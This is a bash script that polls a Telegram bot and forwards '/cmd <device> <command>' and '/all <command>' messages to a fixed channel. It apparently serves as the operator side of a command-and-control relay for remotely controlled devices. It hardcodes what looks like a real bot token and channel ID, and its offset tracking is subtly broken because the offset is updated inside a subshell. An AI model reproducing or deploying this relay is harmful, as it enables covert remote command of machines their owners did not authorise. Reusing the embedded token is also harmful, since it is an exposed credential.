#!/bin/bash
BOT_TOKEN="8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk"
CHANNEL_ID="-1004369057597"
API="https://api.telegram.org/bot$BOT_TOKEN"
OFFSET=0

while true; do
  updates=$(curl -s "$API/getUpdates?offset=$OFFSET&timeout=30" 2>/dev/null)
  echo "$updates" | grep -o '"update_id":[0-9]*' | cut -d: -f2 | while read update_id; do
    [ "$update_id" -gt "$OFFSET" ] && OFFSET=$update_id
  done
  echo "$updates" | grep -oP '"text":"\K[^"]+' | while read -r text; do
    msg_chat_id=$(echo "$updates" | grep -oP '"chat":{"id":\K[0-9]+' | head -1)
    if echo "$text" | grep -q "^/cmd "; then
      args="${text#/cmd }"
      device="${args%% *}"
      command="${args#$device }"
      curl -s -X POST "$API/sendMessage" -d "chat_id=$CHANNEL_ID" -d "text=$device $command" >/dev/null 2>&1
      curl -s -X POST "$API/sendMessage" -d "chat_id=$msg_chat_id" -d "text=✅ $device $command" >/dev/null 2>&1
    elif echo "$text" | grep -q "^/all "; then
      cmd="${text#/all }"
      curl -s -X POST "$API/sendMessage" -d "chat_id=$CHANNEL_ID" -d "text=_ALL_ $cmd" >/dev/null 2>&1
      curl -s -X POST "$API/sendMessage" -d "chat_id=$msg_chat_id" -d "text=✅ Broadcast: $cmd" >/dev/null 2>&1
    fi
  done
  sleep 5
done